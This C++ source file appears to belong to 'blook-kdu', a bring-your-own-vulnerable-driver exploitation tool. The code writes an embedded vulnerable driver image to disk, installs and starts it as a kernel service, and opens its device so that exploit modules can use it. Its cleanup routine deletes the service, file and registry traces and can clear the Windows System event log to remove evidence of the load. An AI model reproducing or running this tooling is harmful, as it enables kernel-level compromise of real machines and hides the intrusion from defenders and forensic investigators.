// blook-kdu: vulnerable driver service installation implementation.
#include "core/service_host.h"

#include <algorithm>
#include <mutex>
#include <span>
#include <string>
#include <vector>

#include "core/device_io.h"
#include "core/log.h"
#include "core/resources.h"
#include "core/trace.h"
#include "core/win32.h"

namespace blook::kdu::core {
namespace {

// sanity checks for a kernel driver image before we write it to disk
Result<void> validate_driver_image(std::span<const std::uint8_t> image,
                                   const exploits::ExploitInfo& info) {
    if (image.size() < 0x200) {
        return Result<void>::fail(Status::invalid_image,
                                  "embedded driver image is too small");
    }
    const auto* dos = reinterpret_cast<const IMAGE_DOS_HEADER*>(image.data());
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        return Result<void>::fail(Status::invalid_image,
                                  "embedded image for " + std::string(info.id) +
                                      " has no DOS signature");
    }
    if (dos->e_lfanew <= 0 ||
        static_cast<std::size_t>(dos->e_lfanew) + 0x100 > image.size()) {
        return Result<void>::fail(Status::invalid_image,
                                  "embedded image has a broken e_lfanew");
    }
    const auto* nt =
        reinterpret_cast<const IMAGE_NT_HEADERS*>(image.data() + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        return Result<void>::fail(Status::invalid_image,
                                  "embedded image has no PE signature");
    }
    if (nt->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) {
        return Result<void>::fail(Status::invalid_image,
                                  "embedded image is not x64");
    }
    return Result<void>::ok();
}

std::string default_device_name(const exploits::ExploitInfo& info) {
    if (!info.device_name.empty()) {
        return std::string(info.device_name);
    }
    return "\\\\.\\" + std::string(info.service_name);
}

}  // namespace

ServiceHost::ServiceHost() = default;

ServiceHost::~ServiceHost() {
    // Best effort: never throw from the destructor.
    (void)cleanup(false);
}

Result<ServiceControl*> ServiceHost::scm() {
    if (!scm_) {
        auto opened = ServiceControl::open();
        if (!opened) {
            return Result<ServiceControl*>::fail(opened.error().code,
                                                 opened.error().message);
        }
        scm_ = std::move(opened.value());
    }
    return Result<ServiceControl*>::ok(&*scm_);
}

Result<std::unique_ptr<exploits::IDeviceIo>> ServiceHost::start(
    const exploits::ExploitInfo& info) {
    if (info.image_resource_id == 0) {
        return Result<std::unique_ptr<exploits::IDeviceIo>>::fail(
            Status::invalid_argument, "exploit has no embedded driver image");
    }
    auto manager_result = scm();
    if (!manager_result) {
        return Result<std::unique_ptr<exploits::IDeviceIo>>::fail(
            manager_result.error().code, manager_result.error().message);
    }
    ServiceControl* manager = manager_result.value();

    auto image = load_embedded_resource(info.image_resource_id);
    if (!image) {
        return Result<std::unique_ptr<exploits::IDeviceIo>>::fail(
            image.error().code, image.error().message);
    }
    auto valid = validate_driver_image(image.value(), info);
    if (!valid) {
        return Result<std::unique_ptr<exploits::IDeviceIo>>::fail(
            valid.error().code, valid.error().message);
    }

    const std::string driver_path = make_staging_path(
        ("kdu_" + std::string(info.service_name) + "_").c_str(), ".sys");
    auto written = write_file(driver_path, image->data(), image->size());
    if (!written) {
        return Result<std::unique_ptr<exploits::IDeviceIo>>::fail(
            written.error().code, written.error().message);
    }

    const std::wstring service = to_utf16(info.service_name);
    std::wstring path = to_utf16(driver_path);
    // Kernel driver ImagePath must be an NT path; the SCM rejects a bare DOS
    // path with ERROR_INVALID_NAME on some Windows builds.
    if (path.size() > 2 && path[1] == L':') {
        path = L"\\??\\" + path;
    }
    auto created = manager->create_driver(service, path);
    if (!created) {
        (void)remove_file(driver_path);
        return Result<std::unique_ptr<exploits::IDeviceIo>>::fail(
            created.error().code, "cannot create service '" +
                                      std::string(info.service_name) +
                                      "': " + created.error().message);
    }
    KDU_LOG_INFO("staged driver '{}' -> {}", info.driver_file, driver_path);

    auto started = manager->start(service);
    if (!started) {
        (void)manager->remove(service);
        (void)remove_file(driver_path);
        return Result<std::unique_ptr<exploits::IDeviceIo>>::fail(
            started.error().code, "cannot start service '" +
                                      std::string(info.service_name) +
                                      "': " + started.error().message);
    }

    const std::string device_name = default_device_name(info);
    auto device = open_device(device_name);
    if (!device) {
        (void)manager->stop(service);
        (void)manager->remove(service);
        (void)remove_file(driver_path);
        return Result<std::unique_ptr<exploits::IDeviceIo>>::fail(
            device.error().code, "cannot open device '" + device_name +
                                     "': " + device.error().message);
    }

    {
        std::lock_guard<std::mutex> lock(mutex_);
        staged_.push_back(StagedArtifact{
            std::string(info.service_name), device_name, driver_path,
            std::string(info.driver_file), false, false});
        history_.push_back(std::string(info.service_name));
    }
    remember_staged_driver(info.service_name, driver_path);
    KDU_LOG_INFO("exploit driver '{}' running as service '{}'", info.id,
                 info.service_name);
    return Result<std::unique_ptr<exploits::IDeviceIo>>::ok(
        std::unique_ptr<exploits::IDeviceIo>(std::move(device.value())));
}

Result<void> ServiceHost::stop(const exploits::ExploitInfo& info) {
    auto manager_result = scm();
    if (!manager_result) {
        return Result<void>::fail(manager_result.error().code,
                                  manager_result.error().message);
    }
    ServiceControl* manager = manager_result.value();
    const std::wstring service = to_utf16(info.service_name);
    (void)manager->stop(service);
    auto removed = manager->remove(service);

    std::string driver_path;
    {
        std::lock_guard<std::mutex> lock(mutex_);
        for (auto& artifact : staged_) {
            if (artifact.service_name == info.service_name) {
                artifact.service_removed = true;
                driver_path = artifact.driver_path;
            }
        }
    }
    if (!driver_path.empty()) {
        (void)remove_file(driver_path);
        forget_staged_driver(info.service_name);
        std::lock_guard<std::mutex> lock(mutex_);
        for (auto& artifact : staged_) {
            if (artifact.driver_path == driver_path) {
                artifact.file_removed = true;
            }
        }
    }
    return removed;
}

Result<CleanupReport> ServiceHost::cleanup(bool clean_event_log) {
    CleanupReport report;
    std::vector<StagedArtifact> artifacts;
    {
        std::lock_guard<std::mutex> lock(mutex_);
        artifacts = staged_;
    }

    if (!artifacts.empty()) {
        auto manager_result = scm();
        if (!manager_result) {
            report.clean = false;
            report.residuals.push_back("service manager unavailable: " +
                                       manager_result.error().message);
        } else {
            ServiceControl* manager = manager_result.value();
            for (const auto& artifact : artifacts) {
                const std::wstring service = to_utf16(artifact.service_name);
                const auto state = manager->query(service);
                if (state) {
                    (void)manager->stop(service);
                }
                const auto removed = manager->remove(service);
                if (removed) {
                    report.actions.push_back("removed service " +
                                             artifact.service_name);
                } else {
                    report.residuals.push_back(
                        "service not removed: " + artifact.service_name + ": " +
                        removed.error().message);
                    report.clean = false;
                }
                const auto file_removed = remove_file(artifact.driver_path);
                if (file_removed) {
                    report.actions.push_back("deleted file " +
                                             artifact.driver_path);
                } else {
                    report.residuals.push_back(
                        "file not removed: " + artifact.driver_path + ": " +
                        file_removed.error().message);
                    report.clean = false;
                }
                auto registry =
                    delete_service_registry_key(artifact.service_name);
                if (registry) {
                    report.actions.push_back("deleted registry key Services\\" +
                                             artifact.service_name);
                } else {
                    report.residuals.push_back("registry key remains: " +
                                               registry.error().message);
                    report.clean = false;
                }
            }
        }
    }

    if (clean_event_log) {
        auto event_log = clear_system_event_log();
        if (event_log) {
            report.actions.push_back("cleared System event log");
        } else {
            report.residuals.push_back("event log not cleared: " +
                                       event_log.error().message);
            report.clean = false;
        }
    } else if (!artifacts.empty()) {
        report.residuals.push_back(
            "Service Control Manager events remain in the System event log; "
            "run cleanup with --event-log to clear them");
    }

    {
        std::lock_guard<std::mutex> lock(mutex_);
        for (auto& artifact : staged_) {
            artifact.service_removed = true;
            artifact.file_removed = true;
        }
        staged_.clear();
    }
    return Result<CleanupReport>::ok(report);
}

std::vector<std::string> ServiceHost::service_history() const {
    std::lock_guard<std::mutex> lock(mutex_);
    return history_;
}

std::vector<StagedArtifact> ServiceHost::staged() const {
    std::lock_guard<std::mutex> lock(mutex_);
    return staged_;
}

}  // namespace blook::kdu::core
